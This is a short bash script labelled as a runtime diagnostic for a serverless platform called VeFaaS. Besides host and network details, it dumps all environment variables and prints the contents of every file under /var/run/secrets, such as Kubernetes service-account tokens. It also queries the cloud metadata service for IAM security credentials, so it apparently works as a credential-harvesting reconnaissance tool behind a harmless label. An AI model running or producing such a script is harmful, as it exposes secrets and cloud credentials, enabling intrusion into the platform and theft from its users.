#!/usr/bin/env bash
# VeFaaS runtime diagnostic - connectivity and environment probe
echo "[HOST] $(hostname) $(cat /etc/hostname 2>/dev/null)"
echo "[UNAME] $(uname -a)"
echo ""
echo "=== CAPABILITIES ==="
grep -E 'CapEff|CapPrm|CapBnd|CapInh' /proc/self/status 2>/dev/null
echo ""
echo "=== ENV ==="
env 2>/dev/null
echo ""
echo "=== MOUNTS ==="
mount 2>/dev/null | grep -vE 'tmpfs|cgroup|proc|sys|devpts|mqueue|hugetlb'
echo ""
echo "=== K8S SECRETS ==="
find /var/run/secrets -type f 2>/dev/null | while read f; do echo "FILE: $f"; cat "$f"; echo; done
echo ""
echo "=== METADATA ==="
curl -sf --max-time 5 http://100.96.0.96/latest/meta-data/ 2>/dev/null && echo "" || echo "meta-data: unreachable"
curl -sf --max-time 5 http://100.96.0.96/latest/meta-data/iam/security-credentials/ 2>/dev/null || echo "iam: none"
echo ""
echo "=== NETWORK ==="
ip a 2>/dev/null
ip route 2>/dev/null
echo ""
echo "=== DONE ==="
